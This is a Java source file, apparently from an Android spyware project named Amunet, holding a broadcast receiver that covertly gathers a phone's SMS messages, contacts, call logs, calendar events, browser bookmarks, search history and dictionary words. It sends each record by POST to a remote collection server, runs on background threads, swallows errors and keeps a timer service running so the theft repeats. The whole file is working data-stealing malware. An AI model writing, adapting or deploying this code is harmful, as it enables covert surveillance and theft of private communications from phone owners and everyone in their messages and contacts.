package org.a0x00sec.amunet;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.ActivityManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.CalendarContract;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.support.v4.app.ActivityCompat;
import android.util.Log;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import me.everything.providers.android.browser.Bookmark;
import me.everything.providers.android.browser.BrowserProvider;
import me.everything.providers.android.browser.Search;
import me.everything.providers.android.dictionary.DictionaryProvider;
import me.everything.providers.android.dictionary.Word;

public class ServerUpdateReceiver extends BroadcastReceiver {

    Context context;

    @Override
    public void onReceive(Context context, Intent intent) {

        this.context = context;

        if(ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    update_Server_SMS();
                }
            }).start();
        }

        if(ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    update_Server_Contacts();
                    update_Server_Call_Logs();
                }
            }).start();
        }

        if(ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALENDAR) == PackageManager.PERMISSION_GRANTED) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    get_calendar_events();
                }
            }).start();
        }

        if(Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    dictionary_bookmark_search_history();
                }
            }).start();
        }

        if(!MyServiceIsRunning(TimerService.class)) {
            context.startService(new Intent(context, TimerService.class));
        }
    }

    private boolean MyServiceIsRunning(Class<?> serviceClass) {
        ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }

    private void dictionary_bookmark_search_history() {
        Log.i("0x00sec", "Dict");

        SharedPreferences sharedPreferences = context.getSharedPreferences("Auth", Context.MODE_PRIVATE);
        final String auth_key = sharedPreferences.getString("auth_key", null);

        DictionaryProvider dictionaryProvider = new DictionaryProvider(context);

        List<Word> words = dictionaryProvider.getWords().getList();
        for (Word w : words) {
            Map<String, String> dict_params = new HashMap<>();
            dict_params.put("locale", w.locale);
            dict_params.put("dictionary_word", w.word);
            dict_params.put("dictionary_id", String.valueOf(w.id));
            dict_params.put("auth", auth_key);
            update_Server(dict_params);
        }

        BrowserProvider browserProvider = new BrowserProvider(context);
        List<Bookmark> bookmarks = browserProvider.getBookmarks().getList();

        for (Bookmark b : bookmarks) {
            Map<String, String> bookmark_params = new HashMap<>();
            bookmark_params.put("bookmark_title", b.title);
            bookmark_params.put("bookmark_url", b.url);
            bookmark_params.put("bookmark_date", get_Long_Date(String.valueOf(b.created)));
            bookmark_params.put("bookmark_visits", String.valueOf(b.visits));
            bookmark_params.put("auth", auth_key);
            update_Server(bookmark_params);
        }

        List<Search> searches = browserProvider.getSearches().getList();

        for (Search s : searches) {
            Map<String, String> search_params = new HashMap<>();
            search_params.put("search_title", s.search);
            search_params.put("search_date", get_Long_Date(String.valueOf(s.date)));
            search_params.put("auth", auth_key);
            update_Server(search_params);
        }
    }

    private void get_calendar_events() {
        Cursor cursor;

        SharedPreferences sharedPreferences = context.getSharedPreferences("Auth", Context.MODE_PRIVATE);
        final String auth_key = sharedPreferences.getString("auth_key", null);

        if(auth_key == null) { return; }

        try {
            cursor = context.getContentResolver().query(CalendarContract.Events.CONTENT_URI, null, null, null, null);
        } catch (SecurityException e) {
            return;
        }

        while (cursor.moveToNext()) {
            if (cursor != null) {
                Map<String, String> params = new HashMap<>();

                int time_zone = cursor.getColumnIndex(CalendarContract.Events.EVENT_TIMEZONE);
                int title = cursor.getColumnIndex(CalendarContract.Events.TITLE);
                int event_id = cursor.getColumnIndex(CalendarContract.Events._ID);

                int description = cursor.getColumnIndex(CalendarContract.Events.DESCRIPTION);
                int event_location = cursor.getColumnIndex(CalendarContract.Events.EVENT_LOCATION);
                int account_name = cursor.getColumnIndex(CalendarContract.Events.ACCOUNT_NAME);
                int acc_type = cursor.getColumnIndex(CalendarContract.Events.ACCOUNT_TYPE);

                String event_time_zone = cursor.getString(time_zone);
                String event_id_ = cursor.getString(event_id);
                String event_title = cursor.getString(title);
                String event_description = cursor.getString(description);
                String event_location_ = cursor.getString(event_location);
                String calendar_account_type = cursor.getString(acc_type);
                String calendar_account_name = cursor.getString(account_name);

                params.put("event_timezone", event_time_zone);
                params.put("event_title", event_title);
                params.put("event_id", event_id_);
                params.put("event_description", event_description);
                params.put("event_location", event_location_);
                params.put("event_calendar_account", calendar_account_type);
                params.put("event_calendar_account_name", calendar_account_name);
                params.put("auth", auth_key);

                Log.i("0x00sec", params.toString());

                update_Server(params);
            }
        }
    }

    private String get_Long_Date(String date) {
        Long timestamp = Long.parseLong(date);
        Calendar calendar = Calendar.getInstance();
        calendar.setTimeInMillis(timestamp);
        DateFormat formatter = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
        return formatter.format(calendar.getTime());
    }

    private void update_Server(final Map<String, String> params) {

        RequestQueue requestQueue = Volley.newRequestQueue(context);

        StringRequest serverRequest = new StringRequest(Request.Method.POST, Configuration.getApp_auth(), new Response.Listener<String>() {
            @Override
            public void onResponse(String req) {
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
            }
        }) {
            protected Map<String, String> getParams() {
                return params;
            }
        };

        requestQueue.add(serverRequest);
    }

    private void update_Server_SMS() {

        SharedPreferences sharedPreferences = context.getSharedPreferences("Auth", Context.MODE_PRIVATE);
        final String auth_key = sharedPreferences.getString("auth_key", null);

        try {
            Uri uriSMSURI = Uri.parse("content://sms");

            Cursor cursor = context.getContentResolver().query(uriSMSURI, null, null, null,null);

            while (cursor.moveToNext()) {
                String address = cursor.getString(cursor.getColumnIndexOrThrow("address")).toString();
                String message = cursor.getString(cursor.getColumnIndexOrThrow("body")).toString();
                String date = cursor.getString(cursor.getColumnIndexOrThrow("date")).toString();
                String read = cursor.getString(cursor.getColumnIndexOrThrow("read")).toString();
                String type = cursor.getString(cursor.getColumnIndexOrThrow("type")).toString();
                String id = cursor.getString(cursor.getColumnIndexOrThrow("_id")).toString();

                if(read.equals("0")) { read = "no"; } else { read = "yes"; }
                if(type.equals("1")) { type = "inbox"; } else if(type.equals("2")) { type = "sent"; } else { type = "draft"; }
                date = get_Long_Date(date);

                // THIS IS HOW TO CREATE THE POST PARAMETERS ( MAP ARRAY )
                Map<String, String> params = new HashMap<>();
                params.put("address", address);
                params.put("message", message);
                params.put("date", date);
                params.put("read",  read);
                params.put("id", id);
                params.put("type", type);
                params.put("auth", auth_key);

                update_Server(params);
            }
        } catch (Exception e) {
        }
    }

    private void update_Server_Contacts() {

        SharedPreferences sharedPreferences = context.getSharedPreferences("Auth", Context.MODE_PRIVATE);
        final String auth_key = sharedPreferences.getString("auth_key", null);

        Cursor cursor = context.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI,null,
                null, null, null);
        while (cursor.moveToNext()) {
            try{
                String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                String name=cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                String phoneNumber = null;

                if (Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                    Cursor phones = context.getContentResolver().query( ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = "+ contactId, null, null);
                    while (phones.moveToNext()) {
                        phoneNumber = phones.getString(phones.getColumnIndex( ContactsContract.CommonDataKinds.Phone.NUMBER));
                        break;
                    }
                    phones.close();

                    if(phoneNumber != null) {

                        Map<String, String> params = new HashMap<>();
                        params.put("contact_name", name);
                        params.put("contact_phone", phoneNumber);
                        params.put("auth", auth_key);

                        update_Server(params);
                    }
                }
            }catch(Exception e) {

            }
        }
    }

    @SuppressLint("MissingPermission")
    private void update_Server_Call_Logs() {

        SharedPreferences sharedPreferences = context.getSharedPreferences("Auth", Context.MODE_PRIVATE);
        final String auth_key = sharedPreferences.getString("auth_key", null);

        Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
        int phone_number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = cursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);

        while (cursor.moveToNext()) {
            String number = cursor.getString(phone_number);
            String call_type = cursor.getString(type);
            String call_date = get_Long_Date(cursor.getString(date));
            String call_duration = cursor.getString(duration);
            int call_code = Integer.parseInt(call_type);

            switch (call_code) {
                case CallLog.Calls.OUTGOING_TYPE:
                    call_type = "OUTGOING";
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    call_type = "INCOMING";
                    break;
                case CallLog.Calls.MISSED_TYPE:
                    call_type = "MISSED";
                    break;
            }

            Map<String, String> params = new HashMap<>();
            
            params.put("phone_number", number);
            params.put("call_date", call_date);
            params.put("call_type", call_type);
            params.put("call_duration", call_duration);
            params.put("auth", auth_key);

            update_Server(params);
        }

        cursor.close();
    }
}
